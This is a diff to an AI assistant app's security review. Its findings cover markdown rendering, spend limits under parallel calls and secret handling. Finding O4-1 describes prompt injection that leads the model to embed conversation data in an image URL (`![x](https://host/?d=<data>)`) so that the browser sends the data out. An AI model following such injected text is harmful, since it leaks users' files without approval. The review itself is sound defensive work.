@@ -19,6 +19,7 @@ fails on the tree before the fix.
 | ID | Severity | Where | Scenario | Confirmed | State |
 |---|---|---|---|---|---|
 | O4-1 | Medium | `web/src/components/Markdown.tsx` (`markdownHtml`) | An answer containing `![x](https://host/?d=<data>)`, an `<img>`, `srcset`, a video poster, an audio source, an inline `style` with `url(...)`, a `<style>` element or an SVG `<image>` made the browser contact that host as soon as the answer was shown. Text the model read can ask it to put conversation data (a file it read) into such a URL: data leaves with no approval card, the same as an unapproved `web_fetch` | Yes: `web/src/markdown.test.ts`, 9 failing cases before the fix | **Fixed**: styles, media and SVG references are not rendered; an image from another site becomes a link with its host and "not loaded automatically", which the user can open; local (`/…`, relative) and inline (`data:image/`, `blob:`) images stay. Exported reports use the same function |
+| O4-2 | Low | `spike/providers/guard.py` (`GuardedProvider.blocked`) | A monthly limit is checked before each call against the calls already logged, and a call is logged when it finishes. Calls that start before the limit is reached (two chats at once, the parallel steps of a workflow level) all pass, so together they can go past it by their own size. Parallel minds are checked as a batch before they start (`guard_minds`), Lab runs its calls one at a time | Yes: `tests/test_privacy.py::test_a_monthly_limit_counts_finished_calls_so_calls_already_running_can_cross_it` | **Documented** in SECURITY.md (what the limit counts). The overshoot is bounded by the calls in flight; reserving tokens per call was not added for v0.1 |
 
 ## Checked, no finding
 
@@ -31,6 +32,11 @@ fails on the tree before the fix.
 - Charts never load data: the Vega loader refuses every request and specs with `url`, `href` or `image` are refused
   (`web/src/chart.ts`). Artifacts and MCP App views run in sandboxed frames with a CSP that blocks network loads.
 
-## Still to check in this review
+- Stored keys do not come back: a provider key and a connector secret set through the API are absent from every GET
+  route without path parameters (34 routes under `/api`, `/v1`, `/mcp`), from the database and from every file
+  under SPIKE's home except the fallback key store (`secrets.json`, mode 0600, used only without an OS keychain).
+  Guard test: `tests/test_o4_security.py`. Error texts and the call log drop keys in addresses (L4, `strip_url_secrets`).
 
-Spend limits under parallel calls; secrets in API answers, logs and error messages.
+## Not covered
+
+Real Windows and macOS behaviour of the sandbox, fuzzing, and the MCP Apps policy beyond the L2 review.
